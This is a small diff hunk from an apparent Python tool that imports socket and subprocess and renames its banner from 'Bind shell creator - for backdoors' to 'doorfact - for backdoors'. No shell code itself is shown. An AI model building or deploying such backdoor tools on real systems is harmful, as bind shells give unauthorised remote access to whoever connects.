@@ -35,7 +35,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 import socket
 import subprocess
 
-print("Bind shell creator - for backdoors")
+print("doorfact - for backdoors")
 
 # Verbosely  - just for debugging
 
